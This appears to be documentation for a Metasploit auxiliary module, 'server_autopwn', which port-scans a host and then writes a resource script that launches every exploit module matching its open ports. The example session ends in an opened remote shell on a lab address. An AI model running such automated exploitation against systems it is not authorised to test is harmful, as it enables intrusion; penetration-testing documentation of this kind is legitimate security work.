The module server_autopwn will port scan a target, then cross references the open ports 
with the default ports used by metasploit modules from modules/exploits/ then builds 
a custom msfexec.rc resource file to be used against that host.

## Vulnerable Applications

Services running on their *default* ports that have metasploit modules in msf's
modules/exploits/ directory.

## Scanning

By default we scan TCP ports 1-10000, but this can be modified to suit the server in 
question.  This can be changed with the value of PORTS.
ex:
```
set PORTS 22-25,110-900
```
If you can't find any open ports, but know otherwise, play with the TIMEOUT, CONCURRENCY, DELAY, and JITTER options.

## Exploitation

Once open ports have been enumerated, we cross reference them with the default ports used by metasploit
modules, then write a resource script (msfexec.rc) that uses those exploits against the target.  We 
use every matching module recurisively under the dir modules/exploits/.

## Scenarios

First identify a server with at least one open port.

```
$ ./msfconsole
msf5 > use auxiliary/server/server_autopwn
msf5 auxiliary(server/server_autopwn) > set RHOSTS 192.168.1.235
msf5 auxiliary(server/server_autopwn) > set LHOST 192.168.1.207
msf5 auxiliary(server/server_autopwn) > exploit
msf5 auxiliary(server/server_autopwn) > resource msfexec.rc

```
Pray to the computer gods while the resource script is executed...
Wait for a shell.

```
resource (/home/marshall/Code/forks/metasploit-framework/msfexec.rc)> sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.168.1.207:42693 -> 192.168.1.235:6200 (192.168.1.235)

msf5 > 
```

## Thanks

Thanks to the creators (hdm, kris katterjohn) of auxiliary/scanners/portscan/tcp.rb
for the port scanning code!
